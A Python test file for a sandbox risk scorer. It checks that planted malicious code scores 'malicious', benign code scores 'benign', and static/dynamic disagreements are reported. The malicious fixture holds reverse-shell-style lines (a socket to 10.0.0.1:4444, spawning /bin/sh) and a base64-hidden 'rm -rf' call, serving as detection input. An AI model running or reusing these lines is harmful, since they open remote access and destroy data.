import packer.engine.sandbox.static  # noqa: F401
from packer.engine.common.config_schema import compose_config
from packer.engine.sandbox.analyzers import StaticAnalyzer
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.findings import Finding
from packer.engine.sandbox.scorer import RiskReport, RiskScorer

_CALIB = compose_config().engine.sandbox.risk

_MALICIOUS = (
    b"import socket, subprocess, os\n"
    b"s = socket.socket(); s.connect(('10.0.0.1', 4444))\n"
    b"subprocess.Popen(['/bin/sh'], shell=True)\n"
    b"os.system(__import__('base64').b64decode('cm0gLXJm'))\n"
)
_BENIGN = b"def add(a, b):\n    return a + b\n\nif __name__ == '__main__':\n    print(add(1, 2))\n"


def _static(src: bytes) -> list[Finding]:
    return StaticAnalyzer().scan(
        FileSet(files={"m.py": src}), enabled=["ast_rules", "yara_scan", "secrets"]
    )


def test_planted_malicious_scores_malicious():
    report = RiskScorer().score(_static(_MALICIOUS), dynamic=[], calib=_CALIB)
    assert isinstance(report, RiskReport)
    assert report.verdict == "malicious"


def test_benign_scores_benign():
    report = RiskScorer().score(_static(_BENIGN), dynamic=[], calib=_CALIB)
    assert report.verdict == "benign"


def test_disagreement_is_surfaced():
    static = [Finding("high", "ast.eval", "m.py", 1, "eval")]
    report = RiskScorer().score(static, dynamic=[], calib=_CALIB)  # dynamic clean
    assert any("disagree" in d.lower() or "static-only" in d.lower() for d in report.disagreements)
